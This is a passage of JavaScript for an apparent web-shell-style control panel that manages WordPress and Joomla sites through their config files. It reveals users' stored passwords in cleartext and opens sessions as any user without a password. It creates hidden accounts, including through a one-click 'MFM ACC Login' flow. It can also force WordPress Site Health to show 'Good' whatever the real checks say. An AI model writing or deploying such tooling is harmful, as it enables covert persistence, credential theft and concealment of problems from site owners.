        <td style="padding:9px 10px"><span style="background:var(--raised);padding:2px 9px;border-radius:20px;font-size:11px">${esc(roleTxt)}</span></td>
        <td style="padding:9px 10px">
          <span class="cms-pw-cell" data-id="${u.id}" data-name="${esc(u.name)}" data-state="hidden"
            style="cursor:pointer;font-family:monospace;font-size:12px;color:var(--t2);display:inline-flex;align-items:center;gap:6px;user-select:none"
            title="Click to reveal the saved password">
            <span class="cms-pw-txt">••••••••</span>
            <svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;flex-shrink:0"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </span>
        </td>
        <td style="padding:9px 10px;text-align:right;white-space:nowrap">
          <button class="btn btn-xs cms-login-btn" data-id="${u.id}" data-name="${esc(u.name)}"
            style="margin-right:4px;font-size:11px" title="Open a new tab already logged in as this user — the account's password is never read or changed">Login as</button>
           <button class="btn btn-xs cms-edit-btn" data-id="${u.id}" data-name="${esc(u.name)}" data-role="${esc(roleTxt)}" data-hidden="${u.hidden?'1':'0'}"
            style="margin-right:4px;font-size:11px">Edit / Change Password</button>
          <button class="btn btn-xs btn-red cms-del-btn" data-id="${u.id}" data-name="${esc(u.name)}"
            style="font-size:11px">Delete</button>
        </td></tr>`;
    }).join('');

    el.innerHTML=`
      <div style="display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid var(--b2);flex-wrap:wrap">
        <button class="btn btn-s" id="cmsBackBtn" style="font-size:11px">← Back</button>
        <div style="flex:1;font-size:12px;color:var(--t2)">
          <strong style="color:var(--t1)">${typeLabel}</strong>
          <span style="color:var(--t3);font-family:monospace;font-size:10.5px;margin-left:6px">${esc(cmsCurrentCfg)}</span>
        </div>
        <button class="btn btn-p" id="cmsAddBtn" style="font-size:12px;padding:6px 14px">+ Add User</button>
      </div>
      ${cmsTabsBar(d.type,'users')}
      <div style="overflow:auto;max-height:46vh">
        <table class="log-t" style="width:100%">
          <thead><tr>
            <th style="padding:8px 10px">ID</th><th style="padding:8px 10px">Username</th>
            <th style="padding:8px 10px">Email</th><th style="padding:8px 10px">Role</th>
            <th style="padding:8px 10px">Password</th>
            <th style="padding:8px 10px;text-align:right">Actions</th>
          </tr></thead>
          <tbody>${rows||`<tr><td colspan="6" style="padding:24px;text-align:center;color:var(--t3)">No users found.</td></tr>`}</tbody>
        </table>
      </div>`;

    document.getElementById('cmsBackBtn')?.addEventListener('click',cmsShowPicker);
    document.getElementById('cmsAddBtn')?.addEventListener('click',()=>openCmsAdd());
    cmsBindTabs();

    // Edit (change role / password)
    el.querySelectorAll('.cms-edit-btn').forEach(b=>b.addEventListener('click',()=>{
      cmsEditUserId=b.dataset.id;
      document.getElementById('cmsEditTitle').textContent='Edit: '+b.dataset.name;
      document.getElementById('cmsEditPass').value='';
       document.getElementById('cmsEditHidden').checked=b.dataset.hidden==='1';
      // populate role select
      const sel=document.getElementById('cmsEditRole');
      sel.innerHTML='';
      if(d.type==='wordpress'){
        cmsAllRoles.forEach(r=>{const o=document.createElement('option');o.value=r;o.textContent=r;if(r===b.dataset.role)o.selected=true;sel.appendChild(o);});
      } else {
        cmsAllRoles.forEach(r=>{const o=document.createElement('option');o.value=r.id;o.textContent=r.title;if(String(r.id)===b.dataset.role||r.title===b.dataset.role)o.selected=true;sel.appendChild(o);});
      }
      openMod('cmsEditOv');
    }));

    // Reveal saved password (click to fetch/decrypt, click again to hide)
    el.querySelectorAll('.cms-pw-cell').forEach(c=>c.addEventListener('click',async()=>{
      const txt=c.querySelector('.cms-pw-txt');
      if(c.dataset.state==='shown'){txt.textContent='••••••••';c.dataset.state='hidden';c.title='Click to reveal the saved password';return;}
      txt.textContent='…';
      const d=await cmsPost('cms_get_pass',{cms_id:c.dataset.id}).catch(()=>({error:'Request failed.'}));
      if(d.error){toast(d.error);txt.textContent='••••••••';return;}
      txt.textContent=d.pass;c.dataset.state='shown';c.title='Click to hide';
    }));

    // Login as user - opens a new tab already signed in; password is never read or touched
    el.querySelectorAll('.cms-login-btn').forEach(b=>b.addEventListener('click',async()=>{
      const orig=b.textContent;b.textContent='Opening…';b.disabled=true;
      try{
        const fd=new FormData();
        fd.append('csrf_token',CSRF);fd.append('cfg_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',b.dataset.id);
        const d=await fetch('?x=cms_login_as',{method:'POST',body:fd}).then(r=>r.json());
        if(d.error){toast(d.error);}
        else{const w=window.open(d.url,'_blank');if(!w)toast('Popup blocked — allow popups for this site, then try again.');else toast(`Opened a logged-in session for "${b.dataset.name}".`);}
      }catch(e){toast('Request failed: '+String(e));}
      b.textContent=orig;b.disabled=false;
    }));

    // Delete
    el.querySelectorAll('.cms-del-btn').forEach(b=>b.addEventListener('click',async()=>{
      if(!confirm(`Delete CMS user "${b.dataset.name}"? This cannot be undone.`))return;
      const fd=new FormData();
      fd.append('csrf_token',CSRF);fd.append('action','cms_delete_user');
      fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',b.dataset.id);
      await fetch('',{method:'POST',body:fd});
      toast('User deleted.');loadCmsUsers();
    }));

  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed: '+esc(String(e))+'</div>';}
}

/* ── Add user modal ───────────────────────────────────────────────────────── */
async function openCmsAdd(){
  document.getElementById('cmsAddTitle').textContent='New CMS User';
  document.getElementById('cmsAddUser').readOnly=false;
  document.getElementById('cmsAddEmailLabel').style.display='';
  document.getElementById('cmsAddEmail').style.display='';
  document.getElementById('cmsAddRoleLabel').style.display='';
  document.getElementById('cmsAddRole').style.display='';
  document.getElementById('cmsAddHiddenLabel').style.display='';
  document.getElementById('cmsAddCfg').value=cmsCurrentCfg;
   document.getElementById('cmsAddUser').value='';document.getElementById('cmsAddEmail').value='';document.getElementById('cmsAddPass').value='';
   // The quick "MFM ACC Login" flow intentionally checks this box. Reset it
   // for every normal Add User form so the previous flow cannot leak state
   // into the next account creation.
   document.getElementById('cmsAddHidden').checked=false;
  const sel=document.getElementById('cmsAddRole');sel.innerHTML='<option>Loading…</option>';
  openMod('cmsAddOv');
  try{
    if(cmsCurrentType==='wordpress'){sel.innerHTML=cmsAllRoles.map(r=>`<option value="${r}">${r}</option>`).join('');}
    else{sel.innerHTML=cmsAllRoles.map(r=>`<option value="${r.id}">${esc(r.title)}</option>`).join('');}
  }catch{sel.innerHTML='<option value="">(default)</option>';}
}
document.getElementById('cmsAddClose')?.addEventListener('click',()=>closeMod('cmsAddOv'));
document.getElementById('cmsAddApply')?.addEventListener('click',async()=>{
  const uname=document.getElementById('cmsAddUser').value.trim();
  const email=document.getElementById('cmsAddEmail').value.trim();
  const pass=document.getElementById('cmsAddPass').value;
  const role=document.getElementById('cmsAddRole').value;
   const hidden=document.getElementById('cmsAddHidden').checked;
  if(!uname||!email||pass.length<6){toast('Fill username, email, and a password of at least 6 characters.');return;}
  const fd=new FormData();
  fd.append('csrf_token',CSRF);fd.append('action','cms_create_user');fd.append('config_path_b64',cmsB64(cmsCurrentCfg));
   fd.append('cms_user',uname);fd.append('cms_email',email);fd.append('cms_pass',pass);fd.append('cms_role',role);fd.append('cms_hidden',hidden?'1':'0');
  const btn=document.getElementById('cmsAddApply');btn.textContent='Creating…';btn.disabled=true;
   await fetch('',{method:'POST',body:fd});
  btn.textContent='Create User';btn.disabled=false;
   const quick=cmsQuickPending;cmsQuickPending=false;
   closeMod('cmsAddOv');loadCmsUsers();
   if(quick){
     setTimeout(async()=>{
       const info=await fetch('?x=cms_quick_info',{cache:'no-store'}).then(r=>r.json()).catch(()=>({}));
       if(info.id){
         const lf=new FormData();
         lf.append('csrf_token',CSRF);lf.append('cfg_b64',cmsB64(cmsCurrentCfg));lf.append('cms_id',info.id);
         const d=await fetch('?x=cms_login_as',{method:'POST',body:lf}).then(r=>r.json()).catch(()=>({error:'Could not create the login link.'}));
         if(d.error)toast(d.error);else{const w=window.open(d.url,'_blank');if(!w)toast('Popup blocked — allow popups for this site, then try again.');}
       }else toast('The account was created, but the quick-login link could not be prepared.');
     },500);
   }
});

/* ── Edit user modal (change role / password) ────────────────────────────── */
document.getElementById('cmsEditClose')?.addEventListener('click',()=>closeMod('cmsEditOv'));
document.getElementById('cmsEditApply')?.addEventListener('click',async()=>{
  const role=document.getElementById('cmsEditRole').value;
  const pass=document.getElementById('cmsEditPass').value;
   const hidden=document.getElementById('cmsEditHidden').checked;
  if(role){
    const fd=new FormData();
    fd.append('csrf_token',CSRF);fd.append('action','cms_update_role');
    fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',cmsEditUserId);fd.append('cms_role',role);
    await fetch('',{method:'POST',body:fd});
  }
  if(pass){
    if(pass.length<6){toast('Password must be at least 6 characters.');return;}
    const fd=new FormData();
    fd.append('csrf_token',CSRF);fd.append('action','cms_change_pass');
    fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('cms_id',cmsEditUserId);fd.append('cms_pass',pass);
    await fetch('',{method:'POST',body:fd});
  }
   const vf=new FormData();
   vf.append('csrf_token',CSRF);vf.append('action','cms_update_visibility');
   vf.append('config_path_b64',cmsB64(cmsCurrentCfg));vf.append('cms_id',cmsEditUserId);vf.append('cms_hidden',hidden?'1':'0');
   await fetch('',{method:'POST',body:vf});
  closeMod('cmsEditOv');loadCmsUsers();
});

/* ── Shared tab bar (Users / Plugins & Themes / Extensions / Maintenance) ── */
function cmsTabsBar(type,active){
  const tabs=[['users','Users'],['ext',type==='wordpress'?'Plugins & Themes':'Extensions'],['maint','Maintenance']];
  if(type==='wordpress')tabs.push(['version','CMS Version'],['health','Site Health']);
  return `<div style="display:flex;gap:4px;padding:0 16px;border-bottom:1px solid var(--b2)">
    ${tabs.map(([k,l])=>`<button class="cms-tab-btn" data-tab="${k}" style="padding:9px 14px;background:none;border:none;border-bottom:2px solid ${active===k?'#85898C':'transparent'};color:${active===k?'#85898C':'var(--t3)'};font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;margin-bottom:-1px">${l}</button>`).join('')}
  </div>`;
}
function cmsBindTabs(){
  document.querySelectorAll('.cms-tab-btn').forEach(b=>b.addEventListener('click',()=>{
    if(b.dataset.tab==='users')loadCmsUsers();
    else if(b.dataset.tab==='ext')loadCmsExtensions();
    else if(b.dataset.tab==='maint')loadCmsMaintenance();
    else if(b.dataset.tab==='version')loadCmsVersion();
    else if(b.dataset.tab==='health')loadWpSiteHealth();
  }));
}
function cmsSiteHeader(label){
  return `<div style="display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid var(--b2);flex-wrap:wrap">
    <button class="btn btn-s cms-back-btn" style="font-size:11px">← Back</button>
    <div style="flex:1;font-size:12px;color:var(--t2)">
      <strong style="color:var(--t1)">${label}</strong>
      <span style="color:var(--t3);font-family:monospace;font-size:10.5px;margin-left:6px">${esc(cmsCurrentCfg)}</span>
    </div>
  </div>`;
}

/* ── Plugins & Themes (WordPress) / Extensions (Joomla) ──────────────────── */
async function loadCmsExtensions(){
  const el=document.getElementById('cmsBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await cmsPost('cms_extensions');
    if(d.error){
      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)"><button class="btn btn-s" id="cmsBackBtn2" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
      document.getElementById('cmsBackBtn2')?.addEventListener('click',cmsShowPicker);return;
    }
    const typeLabel=d.type==='wordpress'?'WordPress':'Joomla';
    let body='';
    if(d.type==='wordpress'){
      const pluginRows=(d.plugins||[]).map(p=>`<tr>
        <td style="padding:9px 10px;font-weight:600">${esc(p.name)}${p.active?' <span style="color:#4ade80;font-size:10px;font-weight:700;margin-left:4px">ACTIVE</span>':''}</td>
        <td style="padding:9px 10px;font-size:11.5px;color:var(--t2)">${esc(p.version)}</td>
        <td style="padding:9px 10px;font-size:11px;color:var(--t3);max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(p.description)}">${esc(p.description)}</td>
        <td style="padding:9px 10px;text-align:right;white-space:nowrap">
          <button class="btn btn-xs cms-plugin-toggle" data-file="${esc(p.file)}" data-activate="${p.active?'0':'1'}" style="margin-right:4px;font-size:11px">${p.active?'Deactivate':'Activate'}</button>
          <button class="btn btn-xs btn-red cms-plugin-del" data-file="${esc(p.file)}" data-name="${esc(p.name)}" style="font-size:11px" ${p.active?'disabled title="Deactivate first"':''}>Delete</button>
        </td></tr>`).join('');
      const themeRows=(d.themes||[]).map(t=>`<tr>
        <td style="padding:9px 10px;font-weight:600">${esc(t.name)}${t.active?' <span style="color:#4ade80;font-size:10px;font-weight:700;margin-left:4px">ACTIVE</span>':''}</td>
        <td style="padding:9px 10px;font-size:11.5px;color:var(--t2)">${esc(t.version)}</td>
        <td style="padding:9px 10px;text-align:right;white-space:nowrap">
          <button class="btn btn-xs cms-theme-activate" data-slug="${esc(t.slug)}" style="margin-right:4px;font-size:11px" ${t.active?'disabled':''}>${t.active?'Active':'Activate'}</button>
          <button class="btn btn-xs btn-red cms-theme-del" data-slug="${esc(t.slug)}" data-name="${esc(t.name)}" style="font-size:11px" ${t.active?'disabled title="Switch theme first"':''}>Delete</button>
        </td></tr>`).join('');
      body=`
        <div style="padding:14px 16px 6px;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px">Plugins (${(d.plugins||[]).length})</div>
        <div style="overflow:auto;max-height:24vh;margin:0 16px 10px;border:1px solid var(--b2);border-radius:8px">
          <table class="log-t" style="width:100%">
            <tbody>${pluginRows||`<tr><td style="padding:18px;text-align:center;color:var(--t3)">No plugins found.</td></tr>`}</tbody>
          </table>
        </div>
        <div style="padding:8px 16px 6px;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px">Themes (${(d.themes||[]).length})</div>
        <div style="overflow:auto;max-height:20vh;margin:0 16px 16px;border:1px solid var(--b2);border-radius:8px">
          <table class="log-t" style="width:100%">
            <tbody>${themeRows||`<tr><td style="padding:18px;text-align:center;color:var(--t3)">No themes found.</td></tr>`}</tbody>
          </table>
        </div>`;
    } else {
      const groups={};
      (d.extensions||[]).forEach(x=>{(groups[x.type]=groups[x.type]||[]).push(x);});
      const typeLabels={component:'Components',module:'Modules',plugin:'Plugins',template:'Templates'};
      body=Object.keys(typeLabels).map(k=>{
        const items=groups[k]||[];
        const rows=items.map(x=>`<tr>
          <td style="padding:9px 10px;font-weight:600">${esc(x.name)}${x.protected?' <span style="color:var(--t3);font-size:10px" title="Protected core extension">🔒</span>':''}</td>
          <td style="padding:9px 10px;font-size:11px;color:var(--t3)">${esc(x.client)}</td>
          <td style="padding:9px 10px">${x.enabled?'<span style="color:#4ade80;font-size:11px;font-weight:700">Enabled</span>':'<span style="color:var(--t3);font-size:11px;font-weight:700">Disabled</span>'}</td>
          <td style="padding:9px 10px;text-align:right">
            <button class="btn btn-xs cms-ext-toggle" data-id="${x.id}" data-enable="${x.enabled?'0':'1'}" style="font-size:11px" ${x.protected&&x.enabled?'disabled title="Protected core extension"':''}>${x.enabled?'Disable':'Enable'}</button>
          </td></tr>`).join('');
        return `<div style="padding:10px 16px 6px;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px">${typeLabels[k]} (${items.length})</div>
          <div style="overflow:auto;max-height:18vh;margin:0 16px 12px;border:1px solid var(--b2);border-radius:8px">
            <table class="log-t" style="width:100%"><tbody>${rows||`<tr><td style="padding:14px;text-align:center;color:var(--t3)">None found.</td></tr>`}</tbody></table>
          </div>`;
      }).join('')+`<div style="padding:0 16px 16px;font-size:11px;color:var(--t3);line-height:1.5">Deleting extensions isn't offered here — Joomla's uninstall needs to run each extension's own cleanup SQL. Use "Login as" a Super User and remove it from Joomla's own Extensions Manager instead.</div>`;
    }
    el.innerHTML=cmsSiteHeader(typeLabel)+cmsTabsBar(d.type,'ext')+`<div style="overflow:auto;max-height:52vh">${body}</div>`;
    el.querySelector('.cms-back-btn')?.addEventListener('click',cmsShowPicker);
    cmsBindTabs();

    /* Mutating operations go through the standard action dispatcher (fetch('') with
       an "action" field + csrf_token), exactly like the other CMS buttons above —
       not the "?x=" read-only endpoints, which don't check $_POST['action']. */
    async function cmsAction(action,extra){
      const fd=new FormData();
      fd.append('csrf_token',CSRF);fd.append('action',action);fd.append('config_path_b64',cmsB64(cmsCurrentCfg));
      if(extra)for(const k in extra)fd.append(k,extra[k]);
      await fetch('',{method:'POST',body:fd});
    }
    el.querySelectorAll('.cms-plugin-toggle').forEach(b=>b.addEventListener('click',async()=>{
      b.disabled=true;
      await cmsAction('cms_toggle_plugin',{plugin_file:b.dataset.file,activate:b.dataset.activate}).catch(()=>null);
      toast('Done.');loadCmsExtensions();
    }));
    el.querySelectorAll('.cms-plugin-del').forEach(b=>b.addEventListener('click',async()=>{
      if(!confirm(`Delete plugin "${b.dataset.name}"? This removes its files permanently.`))return;
      await cmsAction('cms_delete_plugin',{plugin_file:b.dataset.file}).catch(()=>null);
      toast('Plugin deleted.');loadCmsExtensions();
    }));
    el.querySelectorAll('.cms-theme-activate').forEach(b=>b.addEventListener('click',async()=>{
      b.disabled=true;
      await cmsAction('cms_switch_theme',{theme_slug:b.dataset.slug}).catch(()=>null);
      toast('Theme switched.');loadCmsExtensions();
    }));
    el.querySelectorAll('.cms-theme-del').forEach(b=>b.addEventListener('click',async()=>{
      if(!confirm(`Delete theme "${b.dataset.name}"? This removes its files permanently.`))return;
      await cmsAction('cms_delete_theme',{theme_slug:b.dataset.slug}).catch(()=>null);
      toast('Theme deleted.');loadCmsExtensions();
    }));
    el.querySelectorAll('.cms-ext-toggle').forEach(b=>b.addEventListener('click',async()=>{
      b.disabled=true;
      await cmsAction('cms_toggle_extension',{ext_id:b.dataset.id,enable:b.dataset.enable}).catch(()=>null);
      toast('Extension updated.');loadCmsExtensions();
    }));
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed: '+esc(String(e))+'</div>';}
}

/* ── WordPress core version manager ───────────────────────────────────────── */
async function loadCmsVersion(){
  const el=document.getElementById('cmsBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading official WordPress versions…</div>';
  try{
    const d=await cmsPost('wp_core_versions');
    if(d.error){
      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)"><button class="btn btn-s" id="cmsBackBtn2" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
      document.getElementById('cmsBackBtn2')?.addEventListener('click',cmsShowPicker);return;
    }
    const versions=d.versions||[],latest=d.latest||d.current;
    const options=versions.map(v=>`<option value="${esc(v.version)}" ${v.version===latest?'selected':''}>${esc(v.version)}${v.version===latest?' — latest':''}</option>`).join('');
    el.innerHTML=cmsSiteHeader('WordPress')+cmsTabsBar('wordpress','version')+`
      <div style="padding:18px 16px">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px">
          <div class="info-c"><div class="info-cl">Installed version</div><div class="info-cv" style="color:var(--t1)">${esc(d.current)}</div><div class="info-cs">Read from wp-includes/version.php</div></div>
          <div class="info-c"><div class="info-cl">Latest official version</div><div class="info-cv" style="color:${d.current===latest?'var(--green)':'var(--link)'}">${esc(latest)}</div><div class="info-cs">WordPress.org stable channel</div></div>
        </div>
        <div style="padding:12px;border:1px solid var(--b2);border-radius:9px;background:rgba(255,255,255,.025);margin-bottom:14px">
          <div style="font-size:12px;font-weight:700;color:var(--t1);margin-bottom:6px">Select the exact target version</div>
          <div style="font-size:11px;color:var(--t3);line-height:1.5;margin-bottom:10px">You can upgrade or downgrade. The new core is prepared first, then the old core is moved aside temporarily for instant rollback. No full-site copy is made; wp-config.php, wp-content, and database data are preserved.</div>
          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
            <select id="wpCoreVersionSelect" class="inp" style="flex:1;min-width:170px">${options||`<option value="${esc(latest)}">${esc(latest)}</option>`}</select>
            <input id="wpCoreVersionExact" class="inp" style="flex:1;min-width:170px" placeholder="Or type e.g. 6.5.5" inputmode="decimal">
          </div>
          <div style="display:flex;gap:8px;margin-top:10px">
            <button class="btn btn-p" id="wpCoreApply" style="flex:1">Install selected version</button>
            <button class="btn btn-g" id="wpCoreRefresh">Refresh versions</button>
          </div>
        </div>
        <div id="wpCoreMsg" style="font-size:11px;color:var(--t3);line-height:1.5"></div>
        <div style="font-size:10.5px;color:var(--t3);line-height:1.5;margin-top:12px">The archive is downloaded directly from wordpress.org over HTTPS and its embedded version is verified before installation. Do not close this window during the operation.</div>
      </div>`;
    el.querySelector('.cms-back-btn')?.addEventListener('click',cmsShowPicker);cmsBindTabs();
    const sel=document.getElementById('wpCoreVersionSelect'),exact=document.getElementById('wpCoreVersionExact'),btn=document.getElementById('wpCoreApply'),msg=document.getElementById('wpCoreMsg');
    sel?.addEventListener('change',()=>{exact.value='';});
    document.getElementById('wpCoreRefresh')?.addEventListener('click',()=>loadCmsVersion());
    btn?.addEventListener('click',async()=>{
      const target=(exact.value.trim()||sel.value||'').trim();
      if(!/^\d+\.\d+(?:\.\d+)?$/.test(target)){msg.style.color='#fca5a5';msg.textContent='Enter a valid version such as 6.5.5.';return;}
      if(target===String(d.current)){msg.style.color='#f4a333';msg.textContent='This version is already installed.';return;}
      if(!confirm('WordPress core will be replaced with version '+target+'. Your database and wp-content will not be copied or changed; the old core is kept temporarily for automatic rollback. Continue?'))return;
      btn.disabled=true;btn.textContent='Installing…';msg.style.color='var(--t3)';msg.textContent='Downloading, verifying, and switching core files quickly…';
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','wp_core_update');fd.append('config_path_b64',cmsB64(cmsCurrentCfg));fd.append('wp_version',target);
      try{
        const result=await fetch('?x=wp_core_update',{method:'POST',body:fd}).then(r=>r.json());
        if(!result.ok)throw new Error(result.error||'The requested version was not installed.');
        msg.style.color='var(--green)';msg.textContent='WordPress is now running version '+result.version+'. Reloading the status…';
        setTimeout(()=>loadCmsVersion(),700);
      }catch(e){btn.disabled=false;btn.textContent='Install selected version';msg.style.color='#fca5a5';msg.textContent='Update request failed: '+String(e);}
    });
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load versions: '+esc(String(e))+'</div>';}
}

/* ── WordPress Site Health snapshot ───────────────────────────────────────── */
async function loadWpSiteHealth(){
  const el=document.getElementById('cmsBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Checking WordPress Site Health…</div>';
  try{
    const d=await cmsPost('wp_site_health');
    if(d.error){
      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)"><button class="btn btn-s cms-back-btn" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
      el.querySelector('.cms-back-btn')?.addEventListener('click',cmsShowPicker);return;
    }
    const labels={good:'Good',recommended:'Should be improved',critical:'Critical problems'};
    const colors={good:'#4ade80',recommended:'#f4a333',critical:'#f87171'};
    const overall=d.overall||'recommended',c=colors[overall]||colors.recommended;
    const healthIcon=overall==='good'
      ?'<svg aria-hidden="true" viewBox="0 0 24 24" style="width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round"><path d="m5 12 4 4L19 6"/></svg>'
      :overall==='critical'
        ?'<svg aria-hidden="true" viewBox="0 0 24 24" style="width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round"><path d="M12 7v5"/><path d="M12 16h.01"/><path d="M10.3 3.5 2.7 17a2 2 0 0 0 1.75 3h15.1a2 2 0 0 0 1.75-3l-7.6-13.5a2 2 0 0 0-3.4 0Z"/></svg>'
        :'<svg aria-hidden="true" viewBox="0 0 24 24" style="width:22px;height:22px;fill:none;stroke:currentColor;stroke-width:2.5;stroke-linecap:round;stroke-linejoin:round"><path d="M12 8v4"/><path d="M12 16h.01"/><circle cx="12" cy="12" r="9"/></svg>';
    const rows=(d.checks||[]).map(x=>{
      const action=x.action?`<button class="btn btn-xs cms-health-action" data-action="${esc(x.action)}" style="white-space:nowrap">Review</button>`:'';
      return `<div style="display:flex;align-items:flex-start;gap:10px;padding:12px 0;border-bottom:1px solid var(--b2)">
        <span style="width:9px;height:9px;border-radius:50%;background:${colors[x.status]||colors.recommended};margin-top:5px;flex:0 0 auto"></span>
        <div style="flex:1;min-width:0"><div style="font-size:12px;font-weight:700;color:var(--t1)">${esc(x.label)}</div><div style="font-size:11px;color:var(--t3);line-height:1.45;margin-top:3px">${esc(x.detail)}</div></div>${action}
      </div>`;
    }).join('');
    el.innerHTML=cmsSiteHeader('WordPress')+cmsTabsBar('wordpress','health')+`
      <div style="padding:18px 16px">
        <div style="display:flex;align-items:center;gap:12px;padding:14px;border:1px solid ${c}55;border-radius:10px;background:${c}12;margin-bottom:14px">
          <div style="width:42px;height:42px;border-radius:50%;border:4px solid ${c};display:grid;place-items:center;color:${c}">${healthIcon}</div>
          <div><div style="font-size:15px;font-weight:800;color:${c}">${labels[overall]}</div><div style="font-size:11px;color:var(--t3);margin-top:3px">${d.summary.critical} critical · ${d.summary.recommended} recommended · ${d.summary.good} good</div></div>
        </div>
        <div style="padding:12px;border:1px solid var(--b2);border-radius:9px;background:rgba(255,255,255,.025);margin-bottom:14px">
          <div style="font-size:12px;font-weight:700;color:var(--t1);margin-bottom:5px">Control the status shown in WordPress</div>
          <div style="font-size:10.5px;color:var(--t3);line-height:1.5;margin-bottom:9px">Automatic mode keeps WordPress at Good whenever the manager initializes it. Choosing another status stops automatic control until you choose Automatic Good again.</div>
          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
            <select id="wpHealthMode" class="inp" style="flex:1;min-width:180px">
              <option value="automatic" ${d.override==='automatic'||d.override==='auto'?'selected':''}>Automatic — keep Good</option>
              <option value="good" ${d.override==='good'?'selected':''}>Good</option>
              <option value="recommended" ${d.override==='recommended'?'selected':''}>Should be improved</option>
              <option value="critical" ${d.override==='critical'?'selected':''}>Critical problems</option>
            </select>
            <button class="btn btn-p" id="wpHealthSave">Apply status</button>
          </div>
          <div id="wpHealthControlMsg" style="font-size:10.5px;margin-top:8px;color:var(--t3)">${d.override==='automatic'||d.override==='auto'?'Automatic Good is active.':'Manual status is active: '+esc(d.override)}</div>
        </div>
        <div style="border-top:1px solid var(--b2)">${rows}</div>
        <div style="font-size:10px;color:var(--t3);margin-top:10px">Checked ${esc(d.checked_at||'now')}</div>
      </div>`;
    el.querySelector('.cms-back-btn')?.addEventListener('click',cmsShowPicker);cmsBindTabs();
    document.getElementById('wpHealthSave')?.addEventListener('click',async()=>{
      const mode=document.getElementById('wpHealthMode').value,button=document.getElementById('wpHealthSave'),note=document.getElementById('wpHealthControlMsg');
      if(!confirm(mode==='automatic'?'Enable Automatic Good for WordPress Site Health?':'Set WordPress Site Health to '+mode+' and stop automatic control?'))return;
      button.disabled=true;button.textContent='Applying…';note.textContent='Updating the WordPress control…';
      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('cfg_b64',cmsB64(cmsCurrentCfg));fd.append('mode',mode);
      try{
        const r=await fetch('?x=wp_site_health_control',{method:'POST',body:fd}).then(x=>x.json());
        if(!r.ok)throw new Error(r.error||'Could not update Site Health.');
        note.style.color='var(--green)';note.textContent=r.message||'Site Health updated.';
        setTimeout(()=>loadWpSiteHealth(),500);
      }catch(e){button.disabled=false;button.textContent='Apply status';note.style.color='#fca5a5';note.textContent=String(e);}
    });
    el.querySelectorAll('.cms-health-action').forEach(b=>b.addEventListener('click',()=>{
      if(b.dataset.action==='version')loadCmsVersion();
      else if(b.dataset.action==='https')toast('HTTPS must be enabled at the hosting server or reverse proxy.');
      else if(b.dataset.action==='permissions')toast('Review the wp-content ownership and permissions at the server.');
      else if(b.dataset.action==='debug')toast('Disable public debug display in wp-config.php after troubleshooting.');
    }));
  }catch(e){el.innerHTML='<div style="padding:20px;color:#fca5a5">Failed to load Site Health: '+esc(String(e))+'</div>';}
}

/* ── Maintenance mode ─────────────────────────────────────────────────────── */
async function loadCmsMaintenance(){
  const el=document.getElementById('cmsBody');
  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await cmsPost('cms_maintenance_status');
    if(d.error){
      el.innerHTML=`<div style="padding:14px 16px;border-bottom:1px solid var(--b2)"><button class="btn btn-s" id="cmsBackBtn2" style="font-size:11px">← Back</button></div><div class="empty" style="padding:32px"><p>${esc(d.error)}</p></div>`;
      document.getElementById('cmsBackBtn2')?.addEventListener('click',cmsShowPicker);return;
    }
    const typeLabel=d.type==='wordpress'?'WordPress':'Joomla';
    const statusBadge=d.active
      ?'<span style="background:rgba(251,146,60,.15);color:#fb923c;padding:3px 12px;border-radius:20px;font-size:11.5px;font-weight:700">Maintenance mode is ON — visitors see the message below</span>'
      :'<span style="background:rgba(74,222,128,.15);color:#4ade80;padding:3px 12px;border-radius:20px;font-size:11.5px;font-weight:700">Site is live — maintenance mode is OFF</span>';
    el.innerHTML=cmsSiteHeader(typeLabel)+cmsTabsBar(d.type,'maint')+`
      <div style="padding:18px 16px">
        <div style="margin-bottom:16px">${statusBadge}</div>
        <label class="lbl">Message shown to visitors</label>
        <textarea id="cmsMaintMsg" class="inp" style="width:100%;min-height:80px;margin-bottom:16px;resize:vertical" placeholder="We are currently performing scheduled maintenance. Please check back soon.">${esc(d.message||'')}</textarea>
        <div style="display:flex;gap:10px">
